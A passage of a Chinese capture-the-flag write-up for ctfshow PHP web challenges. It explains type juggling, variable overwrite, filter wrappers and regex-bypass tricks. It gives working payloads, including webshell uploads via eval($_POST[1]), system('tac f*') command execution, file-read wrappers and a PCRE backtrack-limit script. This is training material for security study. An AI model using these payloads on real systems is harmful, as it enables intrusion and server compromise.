a[]=1&amp;b[]=2\n\n\n如果进行了string强制转类型后，则不再接受数组\n弱碰撞：\n$a=(string)$a;\n$b=(string)$b;\nif(  ($a!==$b) &amp;&amp; (md5($a)==md5($b)) ){\necho $flag;\n}\nmd5弱比较，为0e开头的会被识别为科学记数法，结果均为0，所以只需找两个md5后都为0e开头且0e后面均为数字的值即可。\npayload: a=QNKCDZO&amp;b=240610708\n\n强碰撞：\n$a=(string)$a;\n$b=(string)$b;\nif(  ($a!==$b) &amp;&amp; (md5($a)===md5($b)) ){\necho $flag;\n}\n这时候需要找到两个真正的md5值相同数据\n\na=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%00%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1U%5D%83%60%FB_%07%FE%A2&amp;b=M%C9h%FF%0E%E3%5C%20%95r%D4w%7Br%15%87%D3o%A7%B2%1B%DCV%B7J%3D%C0x%3E%7B%95%18%AF%BF%A2%02%A8%28K%F3n%8EKU%B3_Bu%93%D8Igm%A0%D1%D5%5D%83%60%FB_%07%FE%A2\n\nweb98include(\"flag.php\");\n$_GET?$_GET=&amp;$_POST:'flag';\n$_GET['flag']=='flag'?$_GET=&amp;$_COOKIE:'flag';\n$_GET['flag']=='flag'?$_GET=&amp;$_SERVER:'flag';\nhighlight_file($_GET['HTTP_FLAG']=='flag'?$flag:__FILE__);\n?&gt;\n\n发送一个GET请求，POST的值赋给GET，要是不发送GET的值为flag（GET和POST其实都是数组，COOKIE和SERVER也是），通过POST发送HTTP_SERVER的值flag\n\nweb99highlight_file(__FILE__);\n$allow = array();//设置为数组\nfor ($i=36; $i &lt; 0x36d; $i++) { \n    array_push($allow, rand(1,$i));//向数组里面插入随机数\n}\nif(isset($_GET['n']) &amp;&amp; in_array($_GET['n'], $allow)){\n    file_put_contents($_GET['n'], $_POST['content']);\n}\n?&gt;\n\nrand() 函数返回随机整数。\nisset() 函数用于检测变量是否已设置并且非 NULL。\narray_push() 向数组里面插入随机数\n\nin_array() \nin_array延用了php中的==\nin_array()函数有漏洞 没有设置第三个参数 就可以形成自动转换eg:n=1.php自动转换为1\n\nfile_put_contents()把一个字符串写入文件中。\n如果文件不存在，将创建一个文件\n如果成功，该函数将返回写入文件中的字符数。如果失败，则返回 False。\n\n?n=1.php\ncontent=&lt;?php eval($_POST[1]);?&gt;\n\n\n\nweb100highlight_file(__FILE__);\ninclude(\"ctfshow.php\");\n//flag in class ctfshow;\n$ctfshow = new ctfshow();\n$v1=$_GET['v1'];\n$v2=$_GET['v2'];\n$v3=$_GET['v3'];\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\nif($v0){\n    if(!preg_match(\"/\\;/\", $v2)){\n        if(preg_match(\"/\\;/\", $v3)){\n            eval(\"$v2('ctfshow')$v3\");\n        }\n    }\n}\n?&gt;\n\n运算符优先级，所以保证v1为数字就可以了\n\n反射类\nReflectionClass 类 ReflectionClass 类报告了一个类的有关信息。\n\n最简单的方法直接输出这个类即可，也就是构造出 echo new ReflectionClass('ctfshow');\npayload:?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;\n\n&lt;?php\nclass A{\npublic static $flag=\"flag{123123123}\";\nconst  PI=3.14;\nstatic function hello(){\n    echo \"hello&lt;/br&gt;\";\n}\n}\n$a=new ReflectionClass('A');\n\n\nvar_dump($a-&gt;getConstants());  获取一组常量\n输出\n array(1) {\n  [\"PI\"]=&gt;\n  float(3.14)\n}\n\nvar_dump($a-&gt;getName());    获取类名\n输出\nstring(1) \"A\"\n\nvar_dump($a-&gt;getStaticProperties()); 获取静态属性\n输出\narray(1) {\n  [\"flag\"]=&gt;\n  string(15) \"flag{123123123}\"\n}\n\nvar_dump($a-&gt;getMethods()); 获取类中的方法\n输出\narray(1) {\n  [0]=&gt;\n  object(ReflectionMethod)#2 (2) {\n    [\"name\"]=&gt;\n    string(5) \"hello\"\n    [\"class\"]=&gt;\n    string(1) \"A\"\n  }\n}\n\n其他payload\n直接输出$ctfshow;构造出 var_dump($ctfshow);\npayload:v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;\n\n\n直接输出$ctfshow;构造出 var_dump($ctfshow);\npayload:v1=1&amp;v2=var_dump($ctfshow)/*&amp;v3=*/;\n/?v1=1&amp;v2=&amp;v3=?&gt;&lt;?=`tac ctfshow.php`;  \n\n或者拼接\n/?v1=1&amp;v2=new%20Exception&amp;v3=;system(%27cat%20ctfshow.php%27);\n\nflag_is_124446aa0x2d2cf30x2d40e90x2dbe290x2d507c45cfa0fe\"]\n0x2d转换为-\nctfshow{124446aa-2cf3-40e9-be29-507c45cfa0fe}\n\nweb101highlight_file(__FILE__);\ninclude(\"ctfshow.php\");\n//flag in class ctfshow;\n$ctfshow = new ctfshow();\n$v1=$_GET['v1'];\n$v2=$_GET['v2'];\n$v3=$_GET['v3'];\n$v0=is_numeric($v1) and is_numeric($v2) and is_numeric($v3);\nif($v0){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\)|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\;|\\?|[0-9]/\", $v2)){\n        if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\*|\\(|\\-|\\_|\\+|\\=|\\{|\\[|\\\"|\\'|\\,|\\.|\\?|[0-9]/\", $v3)){\n            eval(\"$v2('ctfshow')$v3\");\n        }\n    }\n}\n?&gt;\n\n必须使用反射类\n?v1=1&amp;v2=echo new ReflectionClass&amp;v3=;\n\nflag_f7c086750x2d57210x2d415b0x2dbc460x2de0a24c97b36\n\nctfshow{f7c08675-5721-415b-bc46-e0a24c97b36}最后一段是11位但是应该是12位所以爆破\n\n\nweb102highlight_file(__FILE__);\n$v1 = $_POST['v1'];\n$v2 = $_GET['v2'];\n$v3 = $_GET['v3'];\n$v4 = is_numeric($v2) and is_numeric($v3);\nif($v4){\n    $s = substr($v2,2);\n    $str = call_user_func($v1,$s);\n    echo $str;\n    file_put_contents($v3,$str);\n}\nelse{\n    die('hacker');\n}\n?&gt;\n\nsubstr(string,start,length)\nstring\t必需。规定要返回其中一部分的字符串。\nstart\t\n必需。规定在字符串的何处开始。\n\n正数 - 在字符串的指定位置开始\n负数 - 在从字符串结尾开始的指定位置开始\n0 - 在字符串中的第一个字符处开始\n\nlength\t\n可选。规定被返回字符串的长度。默认是直到字符串的结尾。\n\n正数 - 从 start 参数所在的位置返回的长度\n负数 - 从字符串末端返回的长度\n\ncall_user_func 回调函数\nPHP中所讲的回调函数，其实就是指调用函数时不是向函数中传递标准的变量作为参数，而是将另一个函数作为参数，传递到调用的函数中，回调函数也就是这个作为参数的函数。\n$str = call_user_func($v1,$s);就是将s作为v1函数的参数\n\nhex2bin 把十六进制值转换为 ASCII 字符：\n\n&lt;?php\necho hex2bin(\"48656c6c6f20576f726c6421\");\n?&gt;\n以上实例输出结果:\n\nHello World!\n\npayload\nv2必须是数字\nis_numeric在php5的环境中，是可以识别十六进制的，也就是说，如果传入v2=0x66也是可以识别为数字的。\nvar_dump(is_numeric(\"0x66\"));  php5的环境下返回true  php7返回false\n\n之后经过截断我们就得到了16进制，而且是不带0x的，这时候就可以通过调用函数hex2bin将16进制转换成字符串从而写入木马文件。（hex2bin如果参数带0x会报错）\n\n&lt;?php eval($_POST[1]);?&gt;\n0x3c3f706870206576616c28245f504f53545b315d293b3f3e\n\n\nget:v2=0x3c3f706870206576616c28245f504f53545b315d293b3f3e&amp;v3=1.php\npost:v1=hex2bin\n但是本地环境是php7，v2必须是数字，所以使用php伪协议用base64编码，再bin2hex，\n\n利用base64，同时配合伪协议去写入，但是需要保证通过is_number函数的判断，可以有字母啊，但是必得是e啊，也就是科学计数法啊，来自同一家的payload啊：\n直接参考payload\n$a='&lt;?=`cat *`;';\n$b=base64_encode($a);  // PD89YGNhdCAqYDs=\n$c=bin2hex($b);      //这里直接用去掉=的base64\n输出   5044383959474e6864434171594473\n\n?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php post: v1=hex2bin\n\n带e的话会被认为是科学计数法，可以通过is_numeric检测。\n大家可以尝试下去掉=和带着=的base64解码出来的内容是相同的。因为等号在base64中只是起到填充的作用，不影响具体的数据内容。\n\n\nweb103highlight_file(__FILE__);\n$v1 = $_POST['v1'];\n$v2 = $_GET['v2'];\n$v3 = $_GET['v3'];\n$v4 = is_numeric($v2) and is_numeric($v3);\nif($v4){\n    $s = substr($v2,2);\n    $str = call_user_func($v1,$s);\n    echo $str;\n    if(!preg_match(\"/.*p.*h.*p.*/i\",$str)){\n        file_put_contents($v3,$str);\n    }\n    else{\n        die('Sorry');\n    }\n}\nelse{\n    die('hacker');\n}\n\n?&gt;\n\n同上题\n\n?v2=115044383959474e6864434171594473&amp;v3=php://filter/write=convert.base64-decode/resource=1.php post: v1=hex2bin\n\nweb104sha1与md5类似。都无法处理数组\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n\nif(isset($_POST['v1']) &amp;&amp; isset($_GET['v2'])){\n    $v1 = $_POST['v1'];\n    $v2 = $_GET['v2'];\n    if(sha1($v1)==sha1($v2)){\n        echo $flag;\n    }\n}\n?&gt;\n\n1.可以直接v1=v2\n\n2.使用sha1漏洞，sha1函数处理不了数组，均将为false\n\n3.用科学计数法\nv1=aaK1STfY    //0e76658526655756207688271159624026011393\nv2=aaO8zKZF    //0e89257456677279068558073954252716165668\n\n\n\nweb105highlight_file(__FILE__);\ninclude('flag.php');\nerror_reporting(0);\n$error='你还想要flag嘛？';\n$suces='既然你想要那给你吧！';\nforeach($_GET as $key =&gt; $value){\n    if($key==='error'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}foreach($_POST as $key =&gt; $value){\n    if($value==='flag'){\n        die(\"what are you doing?!\");\n    }\n    $$key=$$value;\n}\nif(!($_POST['flag']==$flag)){\n    die($error);\n}\necho \"your are good\".$flag.\"\\n\";\ndie($suces);\n\n?&gt;\n\ndie() 函数\ndie() 函数输出一条消息，并退出当前脚本。\n该函数是 exit() 函数的别名。\n\nGET /?suces=flag\nPOST flag=123&amp;error=suces\n\nforeach($_GET as $key =&gt; $value)\n    $key=suces $value=flag\n$$key=$$value\n    $suces=$flag//变量覆盖\nforeach($_POST as $key =&gt; $value)\n    $key=flag $value=123 =&gt; $flag=$123=&gt;$123为空，flag为空\n    $key=error $value=suces=&gt; $error=$suces=&gt;现在真正的flag 再error里\n    \n$_POST['flag']==$flag =&gt; 123==null\n执行die($error)，输出flag\n\nGET /?suces=flag&amp;flag=123\nPOST error=suces\n同理\n\nweb106highlight_file(__FILE__);\ninclude(\"flag.php\");\n\nif(isset($_POST['v1']) &amp;&amp; isset($_GET['v2'])){\n    $v1 = $_POST['v1'];\n    $v2 = $_GET['v2'];\n    if(sha1($v1)==sha1($v2) &amp;&amp; $v1!=$v2){\n        echo $flag;\n    }\n}\n?&gt;\n\n1.数组\nPOST v1[]=1\nGET v2[]=2\n\n2.用科学计数法\nv1=aaK1STfY    //0e76658526655756207688271159624026011393\nv2=aaO8zKZF    //0e89257456677279068558073954252716165668\n\nweb107highlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"flag.php\");\n\nif(isset($_POST['v1'])){\n    $v1 = $_POST['v1'];\n    $v3 = $_GET['v3'];\n       parse_str($v1,$v2);\n       if($v2['flag']==md5($v3)){\n           echo $flag;\n       }\n}\n?&gt;\n\nparse_str() 函数把查询字符串解析到变量中。将字符串解析成多个变量\n\nparse_str ( string $encoded_string [, array &amp;$result ] ) : void\n如果设置了第二个变量 result， 变量将会以数组元素的形式存入到这个数组，作为替代。\n\n&lt;?php\nparse_str(\"name=Peter&amp;age=43\",$myArray);\nprint_r($myArray);\n?&gt;\n\n运行结果\nArray ( [name] =&gt; Peter [age] =&gt; 43 )\n\n$a='q=123&amp;p=456';\nparse_str($a,$b);\necho $b['q'];   //输出123\necho $b['p'];   //输出456\n\npayload\nv1=flag=c4ca4238a0b923820dcc509a6f75849b 即1的md5值\nv3=1\n\nweb108ereg %00正则截断\nhighlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"flag.php\");\n\nif (ereg (\"^[a-zA-Z]+$\", $_GET['c'])===FALSE)  {\n    die('error');\n}\n//只有36d的人才能看到flag\nif(intval(strrev($_GET['c']))==0x36d){\n    echo $flag;\n}\n?&gt;\n\nereg()、eregi()，正则函数，可以使用preg_match()来替代\nereg()函数用指定的模式搜索一个字符串中指定的字符串,如果匹配成功返回true,否则,则返回false。搜索字母的字符是大小写敏感的。 ereg函数存在NULL截断漏洞，导致了正则过滤被绕过,所以可以使用%00截断正则匹配\n\n\nstrrev()反转字符串\n\n&lt;?php\necho strrev(\"I love Shanghai!\");\n?&gt;\n!iahgnahS evol I\n\npayload:c=a%00778\n首先正则表达式只会匹配%00之前的内容，后面的被截断掉，可以通过正则表达式检测，后面通过反转成877%00a，再用intval函数获取整数部分得到877，877为0x36d的10进制。\n\nweb109highlight_file(__FILE__);\nerror_reporting(0);\nif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n\n    if(preg_match('/[a-zA-Z]+/', $v1) &amp;&amp; preg_match('/[a-zA-Z]+/', $v2)){\n            eval(\"echo new $v1($v2());\");\n    }\n}\n?&gt;\n\nException 处理用于在指定的错误发生时改变脚本的正常流程，是php内置的异常处理类\n通过异常处理类Exception(system(‘cmd’))可以运行指定代码，并且能返回运行的结果\n\nReflectionClass 或者 ReflectionMethod 都为常用的反射类，可以理解为一个类的映射\n\n?v1=Exception&amp;v2=system(\"tac f*\")\n\n?v1=ReflectionClass&amp;v2=system(\"tac f*\")\n\n?v1=ReflectionMethod&amp;v2=system('tac f*')\n\nweb110highlight_file(__FILE__);\nerror_reporting(0);\nif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n    if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v1)){\n            die(\"error v1\");\n    }\n    if(preg_match('/\\~|\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]/', $v2)){\n            die(\"error v2\");\n    }\n    eval(\"echo new $v1($v2());\");\n}\n?&gt;\n\nphp内置类 \n利用FilesystemIterator 获取指定目录下的所有文件\ngetcwd()函数 获取当前工作目录 返回当前工作目录\n\npayload: ?v1=FilesystemIterator&amp;v2=getcwd\n\n\nweb111highlight_file(__FILE__);\nerror_reporting(0);\ninclude(\"flag.php\");\n\nfunction getFlag(&amp;$v1,&amp;$v2){\n    eval(\"$$v1 = &amp;$$v2;\");\n    var_dump($$v1);\n}\n\nif(isset($_GET['v1']) &amp;&amp; isset($_GET['v2'])){\n    $v1 = $_GET['v1'];\n    $v2 = $_GET['v2'];\n\n    if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/', $v1)){\n            die(\"error v1\");\n    }\n    if(preg_match('/\\~| |\\`|\\!|\\@|\\#|\\\\$|\\%|\\^|\\&amp;|\\*|\\(|\\)|\\_|\\-|\\+|\\=|\\{|\\[|\\;|\\:|\\\"|\\'|\\,|\\.|\\?|\\\\\\\\|\\/|[0-9]|\\&lt;|\\&gt;/', $v2)){\n            die(\"error v2\");\n    }\n    \n    if(preg_match('/ctfshow/', $v1)){\n            getFlag($v1,$v2);\n    }\n}\n?&gt;\n\nv1的值必是ctfshow\n\neval(\"$$v1 = &amp;$$v2;\");//将v2的值赋给v1\n\n$GLOBALS — 引用全局作用域中可用的全部变量\n\npayload：\n?v1=ctfshow&amp;v2=GLOBALS\n//把$GLOBALS赋值给v2，然后v2再赋值给v1,即可将全部变量输出.\n\nweb112highlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($file){\n    if(preg_match('/\\.\\.\\/|http|https|data|input|rot13|base64|string/i',$file)){\n        die(\"hacker!\");\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n}\n\nis_file — 判断给定文件名是否为一个正常的文件\nis_file ( string $filename ) : bool\n\n要获取flag需要满足两个条件，不能让is_file检测是文件，并且highlight_file可以识别为文件，这时候可以利用php伪协议。\n\n可以直接用不带任何过滤器的filter伪协议\nphp://filter 是一种元封装器， 设计用于数据流打开时的筛选过滤应用。 这对于一体式（all-in-one）的文件函数非常有用，类似 readfile()、 file() 和 file_get_contents()， 在数据流内容读取之前没有机会应用其他过滤器。\n\n\n?file=php://filter/resource=flag.php\n\n?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=flag.php\n\n?file=php://filter/read=convert.quoted-printable-encode/resource=flag.php//可打印字符引用编码\n\n?file=compress.zlib://flag.php\t\t//压缩\n\nweb113highlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($file){\n    if(preg_match('/filter|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){\n        die('hacker!');\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n}\n\n在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入\nls /proc/self/root，其实显示的内容是根目录下的内容，多次重复后绕过is_file.\n\n在php中，require_once在调用时php会检查该文件是否已经被包含过，如果是则不会再次包含\n\n?file=compress.zlib://flag.php\t\t//压缩\n\n?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/var/www/html/flag.php\n\nweb114error_reporting(0);\nhighlight_file(__FILE__);\nfunction filter($file){\n    if(preg_match('/compress|root|zip|convert|\\.\\.\\/|http|https|data|data|rot13|base64|string/i',$file)){\n        die('hacker!');\n    }else{\n        return $file;\n    }\n}\n$file=$_GET['file'];\necho \"师傅们居然tql都是非预期 哼！\";\nif(! is_file($file)){\n    highlight_file(filter($file));\n}else{\n    echo \"hacker!\";\n} 师傅们居然tql都是非预期 哼！\n\n?file=php://filter/resource=flag.php\n\nweb115include('flag.php');\nhighlight_file(__FILE__);\nerror_reporting(0);\nfunction filter($num){\n    $num=str_replace(\"0x\",\"1\",$num);\n    $num=str_replace(\"0\",\"1\",$num);\n    $num=str_replace(\".\",\"1\",$num);\n    $num=str_replace(\"e\",\"1\",$num);\n    $num=str_replace(\"+\",\"1\",$num);\n    return $num;\n}\n$num=$_GET['num'];\nif(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){\n    if($num=='36'){\n        echo $flag;\n    }else{\n        echo \"hacker!!\";\n    }\n}else{\n    echo \"hacker!!!\";\n} hacker!!!\n\nis_numeric() 函数用于检测变量是否为数字或数字字符串。\nnum不能是36\n\ntrim(string,charlist)\nstring\t        必需。规定要检查的字符串。\ncharlist\t    可选。规定从字符串中删除哪些字符。如果省略该参数，则移除\n\n测试\n\nfor ($i=0; $i &lt;=128 ; $i++) { \n        $x=chr($i).'1';\n       if(trim($x)!=='1' &amp;&amp;  is_numeric($x)){\n            echo urlencode(chr($i)).\"\\n\";\n       }\n    }\n    \n输出\n%0C(空格)、%2B（+号）、-、.（点）、0、1、2、3、4、5、6、7、8、9\n\n+  .  被过滤   -号不能用（-36）\n发现除了+-.号以外还有只剩下%0c也就是换页符了，所以这个题只有这一个固定的解了。\npayload:num=%0c36\n\nweb123error_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&amp;&amp;isset($_POST['CTF_SHOW.COM'])&amp;&amp;!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?/\", $c)&amp;&amp;$c&lt;=18){\n         eval(\"$c\".\";\");  \n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n}\n?&gt;\n\n$_SERVER 是一个包含了诸如头信息(header)、路径(path)、以及脚本位置(script locations)等等信息的数组。\n'argv'\n    传递给该脚本的参数的数组。当脚本以命令行方式运行时，argv 变量传递给程序 C 语言样式的命令行参数。当通过 GET 方式调用时，该变量包含query string。 \n即$_SERVER[‘argv’][0] = $_SERVER[‘QUERY_STRING’]=（get传参？后面的值）\n例如：\n?$fl0g=flag_give_me;   //get\n$_SERVER[‘argv’][0]=$_SERVER[‘QUERY_STRING’]=\"$fl0g=flag_give_me;\"\n\nPHP变量命名规则：\n只能包含：字母、数字、下划线，其中，只能以字母、下划线开头\n同时GET或POST方式传进去的变量名,会自动将空格+ . [转换为_\n特殊字符[, GET或POST方式传参时,变量名中的[也会被替换为_,但其后的字符就不会被替换了\n如 CTF[SHOW.COM=&gt;CTF_SHOW.COM\n\npayload1:\nCTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=echo $flag\t\n\npayload2:\n?$fl0g=flag_give_me;                           #GET  \nCTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])      #POST  \n\npayload3:\n?a=1+fl0g=flag_give_me                         #GET \nCTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=parse_str($a[1])   #POST \n\nparse_str — 将字符串解析成多个变量\n\nweb125error_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&amp;&amp;isset($_POST['CTF_SHOW.COM'])&amp;&amp;!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print/i\", $c)&amp;&amp;$c&lt;=16){\n         eval(\"$c\".\";\");\n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n}\n?&gt;\n\n?$fl0g=flag_give_me;                           #GET  \nCTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])      #POST  \n\nweb126error_reporting(0);\nhighlight_file(__FILE__);\ninclude(\"flag.php\");\n$a=$_SERVER['argv'];\n$c=$_POST['fun'];\nif(isset($_POST['CTF_SHOW'])&amp;&amp;isset($_POST['CTF_SHOW.COM'])&amp;&amp;!isset($_GET['fl0g'])){\n    if(!preg_match(\"/\\\\\\\\|\\/|\\~|\\`|\\!|\\@|\\#|\\%|\\^|\\*|\\-|\\+|\\=|\\{|\\}|\\\"|\\'|\\,|\\.|\\;|\\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i\", $c) &amp;&amp; strlen($c)&lt;=16){\n         eval(\"$c\".\";\");  \n         if($fl0g===\"flag_give_me\"){\n             echo $flag;\n         }\n    }\n}\n\npayload1:\n?$fl0g=flag_give_me;                           #GET  \nCTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=eval($a[0])      #POST  \n\npayload2:\n?a=1+fl0g=flag_give_me                         #GET \nCTF_SHOW=1&amp;CTF[SHOW.COM=1&amp;fun=parse_str($a[1])   #POST \n\nweb127error_reporting(0);\ninclude(\"flag.php\");\nhighlight_file(__FILE__);\n$ctf_show = md5($flag);\n$url = $_SERVER['QUERY_STRING'];\n\n//特殊字符检测\nfunction waf($url){\n    if(preg_match('/\\`|\\~|\\!|\\@|\\#|\\^|\\*|\\(|\\)|\\\\$|\\_|\\-|\\+|\\{|\\;|\\:|\\[|\\]|\\}|\\'|\\\"|\\&lt;|\\,|\\&gt;|\\.|\\\\\\|\\//', $url)){\n        return true;\n    }else{\n        return false;\n    }\n}\n\nif(waf($url)){\n    die(\"嗯哼？\");\n}else{\n    extract($_GET);\n}\n\nif($ctf_show==='ilove36d'){\n    echo $flag;\n}\n\nextract — 从数组中将变量导入到当前的符号表\n?ctf show=ilove36d=&gt;$ctf show=ilove36d\n\nget传参，并赋值给$url，让waf($url)==false，执行extract($_GET);，把get传入的值导入，然后过if语句就o了\n\npayload1\n在web123就了解过，点或空格会被转化为下划线，由于点被过滤 ，所以可以用上空格。\n?ctf show=ilove36d\n\npayload2\n$_SERVER['QUERY_STRING'];获取的查询语句是服务端还没url解码之前的字符串，所以对_进行一次url编码也能绕过。\n?ctf%5fshow=ilove36d\n\nweb128include(\"flag.php\");\nhighlight_file(__FILE__);\n\n$f1 = $_GET['f1'];\n$f2 = $_GET['f2'];\n\nif(check($f1)){\n    var_dump(call_user_func(call_user_func($f1,$f2)));\n}else{\n    echo \"嗯哼？\";\n}\n\nfunction check($str){\n    return !preg_match('/[0-9]|[a-z]/i', $str);\n\ncall_user_func 回调函数\nPHP中所讲的回调函数，其实就是指调用函数时不是向函数中传递标准的变量作为参数，而是将另一个函数作为参数，传递到调用的函数中，回调函数也就是这个作为参数的函数。\n$str = call_user_func($v1,$s);就是将s作为v1函数的参数\n\n_()是gettext()的拓展函数\n在开启相关设定后，_(\"0\")等价于gettext(\"0\")，且就返回参数0   //_=gettext\n\n&lt;?php\necho gettext(666);   //输出 666\necho _(\"666\");\t\t//输出 666\n?&gt;\n\n//https://www.cnblogs.com/lost-1987/articles/3309693.html\n\nget_defined_vars — 返回由所有已定义变量所组成的数组 \n\nvar_dump(call_user_func(call_user_func($f1,$f2)));\n=&gt; var_dump(call_user_func(call_user_func(_,'get_defined_vars')));\n=&gt; var_dump(call_user_func(get_defined_vars));\n\nf1=_&amp;f2=get_defined_vars\n\n\nweb129highlight_file(__FILE__);\nif(isset($_GET['f'])){\n    $f = $_GET['f'];\n    if(stripos($f, 'ctfshow')&gt;0){\n        echo readfile($f);\n    }\n\nstripos(string $haystack, string $needle, int $offset = 0)查找字符串在另一字符串中第一次出现的位置（不区分大小写）\nint 返回在字符串 haystack 中 needle 首次出现的数字位置，找的是needle与 strpos() 不同，stripos() 不区分大小写\n如果未发现 needle 将返回 false。 //后面会用到\n\nreadfile(string $filename, bool $use_include_path = false, resource $context = ?): int\n 读取文件并写入到输出缓冲。 \n \n参数\nfilename\n    要读取的文件名。\nuse_include_path\n    想要在 include_path 中搜索文件，可使用这个可选的第二个参数，设为 true。\ncontext\n    Stream 上下文（context） resource。\n返回值\n成功时返回从文件中读入的字节数， 或者在失败时返回 false\n\nfilter伪协议支持多种编码方式，无效的就被忽略掉了\n?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php\n?f=php://filter/|ctfshow/resource=flag.php\n?f=/ctfshow/../var/www/html/flag.php\n?f=./ctfshow/../flag.php\n\nweb130include(\"flag.php\");\nif(isset($_POST['f'])){\n    $f = $_POST['f'];\n\n    if(preg_match('/.+?ctfshow/is', $f)){//不能匹配到/.+?ctfshow/\n        die('bye!');\n    }\n    if(stripos($f, 'ctfshow') === FALSE){//传的$f中有ctfshow\n        die('bye!!');\n    }\n\n    echo $flag;\n\n}\n\npayload1\nPCRE回溯次数限制\nhttps://www.leavesongs.com/PENETRATION/use-pcre-backtrack-limit-to-bypass-restrict.html\nPHP为了防止正则表达式的拒绝服务攻击（reDOS），给pcre设定了一个回溯次数上限pcre.backtrack_limit。我们可以通过var_dump(ini_get(‘pcre.backtrack_limit’));的方式查看当前环境下的上限\n//1000000次\n如果回溯次数超过了100万，preg_match返回的非1和0，而是false。\n\n这样也就达到绕过preg_match的目的，通过发送超长字符串的方式，使正则执行失败：\n\nimport requests\n\nurl=\"http://d982e941-58a2-4bbb-8e2e-298bdb38ac17.challenge.ctf.show/\"\n\ndata={\"f\":\"1111\"*250000+\"ctfshow\"}\n\nresponse=requests.post(url=url,data=data)\nprint(response.text)\n\nweb131include(\"flag.php\");\nif(isset($_POST['f'])){\n    $f = (String)$_POST['f'];\n\n    if(preg_match('/.+?ctfshow/is', $f)){\n        die('bye!');\n    }\n    if(stripos($f,'36Dctfshow') === FALSE){\n        die('bye!!');\n    }\n\n    echo $flag;\n\nimport requests\n\nurl=\"http://46824a94-4dcc-45df-9cde-cbd6343c7e49.challenge.ctf.show/\"\n\ndata={\"f\":\"1111\"*250000+\"36Dctfshow\"}\n\nresponse=requests.post(url=url,data=data)\nprint(response.text)\n\nweb132if(isset($_GET['username']) &amp;&amp; isset($_GET['password']) &amp;&amp; isset($_GET['code'])){\n    $username = (String)$_GET['username'];\n    $password = (String)$_GET['password'];\n    $code = (String)$_GET['code'];\n\n    if($code === mt_rand(1,0x36D) &amp;&amp; $password === $flag || $username ===\"admin\"){\n        \n        if($code == 'admin'){\n            echo $flag;\n        }\n        \n    }\n}\n\nphp中&amp;&amp;和||运算符应用 访问/robots.txt,之后访问/admin，获得源代码\n\n对于“与”（&amp;&amp;） 运算： x &amp;&amp; y 当x为false时，直接跳过，不执行y； 